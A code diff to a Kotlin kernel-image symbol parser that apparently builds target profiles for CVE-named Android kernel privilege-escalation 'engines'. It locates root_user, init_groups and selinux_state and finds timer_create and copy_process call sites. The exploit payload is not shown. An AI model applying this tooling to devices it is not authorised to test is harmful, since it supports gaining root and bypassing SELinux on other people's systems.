@@ -191,17 +191,13 @@ object BootSymbolParser {
 
         val initUserNs = syms["init_user_ns"]
             ?: return ParseResult.Error("Required symbol 'init_user_ns' not found in kallsyms.")
-        val rootUser = syms["root_user"]
-            ?: (initUserNs + 0x290)
-        val initUcounts = syms["init_ucounts"]
-            ?: (initUserNs + 0x1B18)
-        val initGroups = syms["init_groups"]
-            ?: (initUserNs + 0x15B0)
+        val rootUser = syms["root_user"] ?: 0L
+        val initUcounts = syms["init_ucounts"] ?: 0L
+        val initGroups = syms["init_groups"] ?: 0L
         val selinuxState = syms["selinux_state"]
             ?: return ParseResult.Error("Required symbol 'selinux_state' not found in kallsyms.")
         val panicOnWarn = syms["panic_on_warn"] ?: 0L
 
-        // Determine baseline architecture & engine
         val (engine, timerSite, timerLow21, copyLow21, siteMask) = deriveEngineAndSites(banner, decompressed, syms)
 
         val detectedModel = detectDeviceName(data, decompressed, filename)
@@ -230,6 +226,11 @@ object BootSymbolParser {
             appendLine("panic_on_warn: 0x%x".format(panicOnWarn))
             appendLine("timer_site: 0x%x (low21: 0x%x)".format(timerSite, timerLow21))
             appendLine("copy_low21: 0x%x".format(copyLow21))
+            if (rootUser == 0L) appendLine("WARNING: root_user not found in kallsyms — using C fallback")
+            if (initUcounts == 0L) appendLine("WARNING: init_ucounts not found in kallsyms — using C fallback")
+            if (initGroups == 0L) appendLine("WARNING: init_groups not found in kallsyms — using C fallback")
+            if (timerSite == 0L) appendLine("WARNING: timer call site not found — profile needs manual timer_site")
+            if (copyLow21 == 0L) appendLine("WARNING: copy call site not found — profile needs manual copy_low21")
             appendLine("Total Symbols Recovered: ${syms.size}")
         }
 
@@ -664,7 +665,6 @@ object BootSymbolParser {
                 val high = image[pos++].toInt() and 0xff
                 if ((high and 0x80) != 0) return null
                 length = (length and 0x7f) or (high shl 7)
-                pos++ // consumed high byte
             }
             if (length == 0 || length > 0x3fff || pos + length > markersOffset) return null
             spans.add(Pair(pos, length))
@@ -900,9 +900,9 @@ object BootSymbolParser {
 
         val initUserNs = syms["init_user_ns"]
             ?: return ParseResult.Error("Text symbol table missing 'init_user_ns'.")
-        val rootUser = syms["root_user"] ?: (initUserNs + 0x290)
-        val initUcounts = syms["init_ucounts"] ?: (initUserNs + 0x1B18)
-        val initGroups = syms["init_groups"] ?: (initUserNs + 0x15B0)
+        val rootUser = syms["root_user"] ?: 0L
+        val initUcounts = syms["init_ucounts"] ?: 0L
+        val initGroups = syms["init_groups"] ?: 0L
         val selinuxState = syms["selinux_state"]
             ?: return ParseResult.Error("Text symbol table missing 'selinux_state'.")
         val panicOnWarn = syms["panic_on_warn"] ?: 0L
@@ -936,6 +936,43 @@ object BootSymbolParser {
         val siteMask: String
     )
 
+    private fun resolveVeneer(image: ByteArray, addr: Long, baseAddr: Long): Long? {
+        val off = (addr - baseAddr).toInt()
+        if (off < 0 || off + 12 > image.size) return null
+        val insn0 = readI32(image, off)
+        // B <target>
+        if ((insn0 ushr 26) == 0x05) {
+            var imm26 = insn0 and 0x03FFFFFF
+            if ((imm26 and 0x02000000) != 0) imm26 = imm26 or (-1 shl 26)
+            return addr + (imm26.toLong() * 4L)
+        }
+        // ADRP Xd, #page; ADD Xd, Xd, #off; BR Xd
+        if ((insn0.toLong() and 0x9F000000L) == 0x90000000L) {
+            val rd = insn0 and 0x1f
+            val immhi = ((insn0 ushr 5) and 0x7ffff).toLong()
+            val immlo = ((insn0 ushr 29) and 0x3).toLong()
+            var imm = (immhi shl 2) or immlo
+            if ((imm and 0x100000L) != 0L) imm = imm or (-1L shl 21)
+            val page = (addr and -4096L) + (imm shl 12)
+            val insn1 = readI32(image, off + 4)
+            if ((insn1 ushr 24) == 0x91) {
+                val addRd = insn1 and 0x1f
+                val addRn = (insn1 ushr 5) and 0x1f
+                if (addRn == rd && addRd == rd) {
+                    val imm12 = ((insn1 ushr 10) and 0xfff).toLong()
+                    val sh = (insn1 ushr 22) and 0x3
+                    val target = page + (if (sh == 1) imm12 shl 12 else imm12)
+                    if (off + 12 > image.size) return null
+                    val insn2 = readI32(image, off + 8)
+                    if ((insn2.toLong() and 0xFFFFFC1FL) == 0xD61F0000L && ((insn2 ushr 5) and 0x1f) == rd) {
+                        return target
+                    }
+                }
+            }
+        }
+        return null
+    }
+
     private fun findCallSiteInFunction(
         image: ByteArray,
         funcAddr: Long,
@@ -950,7 +987,6 @@ object BootSymbolParser {
             val pcOffset = funcOffset + i * 4
             val pc = baseAddr + pcOffset
             val insn = readI32(image, pcOffset)
-            // BL instruction: opcode bits 31..26 are 100101 (0x25)
             if ((insn ushr 26) == 0x25) {
                 var imm26 = insn and 0x03FFFFFF
                 if ((imm26 and 0x02000000) != 0) {
@@ -958,7 +994,11 @@ object BootSymbolParser {
                 }
                 val destAddr = pc + (imm26.toLong() * 4L)
                 if (destAddr == targetAddr) {
-                    return pc + 4L // Return address after BL
+                    return pc + 4L
+                }
+                val veneerDest = resolveVeneer(image, destAddr, baseAddr)
+                if (veneerDest == targetAddr) {
+                    return pc + 4L
                 }
             }
         }
@@ -972,47 +1012,20 @@ object BootSymbolParser {
         val engine = when {
             banner.contains("6.6.118") -> "CVE66118"
             banner.contains("6.6.127") -> "CVE66127"
-            banner.contains("6.6.89") || banner.startsWith("6.6.") -> "CVE6689"
+            banner.contains("6.6.89") -> "CVE6689"
             banner.contains("6.12.58") -> "CVE61258"
             banner.contains("6.12.69") -> "CVE61269"
             banner.contains("6.12.38") -> "CVE61238"
             banner.contains("6.12.30") -> "CVE61230"
             banner.contains("6.12.23") -> "CVE61223"
             banner.startsWith("6.18.") -> "CVE61821"
+            banner.startsWith("6.12.") -> "CVE61269"
+            banner.startsWith("6.6.") -> "CVE6689"
             banner.startsWith("6.1.") -> "CVE61"
             else -> "CVE66118"
         }
 
-        // Baseline defaults
-        var defaultTimerSite = 0xffffffc0801a4dfcUL.toLong()
-        var defaultTimerLow21 = 0x1a4dfcL
-        var defaultCopyLow21 = 0x0ab944L
-        val siteMask = if (banner.startsWith("6.6.")) "0x1fffff" else "0xffff"
-
-        when {
-            banner.startsWith("6.1.") -> {
-                defaultTimerSite = 0xffffffc008192b38UL.toLong()
-                defaultTimerLow21 = 0x192b38L
-                defaultCopyLow21 = 0xab948L
-            }
-            banner.startsWith("6.12.") -> {
-                defaultTimerSite = 0xffffffc0801e1a14UL.toLong()
-                defaultTimerLow21 = 0x1e1a14L
-                defaultCopyLow21 = 0x0d1598L
-            }
-            banner.startsWith("6.18.") -> {
-                defaultTimerSite = 0xffffffc080201a14UL.toLong()
-                defaultTimerLow21 = 0x201a14L
-                defaultCopyLow21 = 0x0e2598L
-            }
-            banner.startsWith("6.6.") -> {
-                defaultTimerSite = 0xffffffc0801a4dfcUL.toLong()
-                defaultTimerLow21 = 0x1a4dfcL
-                defaultCopyLow21 = 0x0ab944L
-            }
-        }
-
-        // Dynamic callsite discovery if uncompressed kernel image is available
+        // Dynamic callsite discovery from uncompressed kernel image
         var dynTimerSite: Long? = null
         var dynCopyLow21: Long? = null
 
@@ -1027,14 +1040,17 @@ object BootSymbolParser {
                 syms["kmem_cache_alloc_lru"]
             )
             val timerFuncs = listOfNotNull(
+                syms["alloc_posix_timer"],
                 syms["do_timer_create"],
                 syms["posix_timer_create"],
                 syms["create_posix_timer"],
+                syms["common_timer_create"],
                 syms["__arm64_sys_timer_create"],
                 syms["__do_sys_timer_create"],
                 syms["sys_timer_create"]
             )
             val copyFuncs = listOfNotNull(
+                syms["alloc_task_struct_node"],
                 syms["copy_process"],
                 syms["dup_task_struct"]
             )
@@ -1052,7 +1068,7 @@ object BootSymbolParser {
 
             for (cFunc in copyFuncs) {
                 for (aTarget in allocTargets) {
-                    val site = findCallSiteInFunction(image, cFunc, base, aTarget)
+                    val site = findCallSiteInFunction(image, cFunc, base, aTarget, maxInstructions = 800)
                     if (site != null) {
                         dynCopyLow21 = site and 0x1fffffL
                         break
@@ -1062,16 +1078,16 @@ object BootSymbolParser {
             }
         }
 
-        val timerSite = dynTimerSite ?: defaultTimerSite
-        val timerLow21 = dynTimerSite?.let { it and 0x1fffffL } ?: defaultTimerLow21
-        val copyLow21 = dynCopyLow21 ?: defaultCopyLow21
+        val timerSite = dynTimerSite ?: 0L
+        val timerLow21 = dynTimerSite?.let { it and 0x1fffffL } ?: 0L
+        val copyLow21 = dynCopyLow21 ?: 0L
 
         return EngineSites(
             engine = engine,
             timerSite = timerSite,
             timerLow21 = timerLow21,
             copyLow21 = copyLow21,
-            siteMask = siteMask
+            siteMask = "0xffff"
         )
     }
 
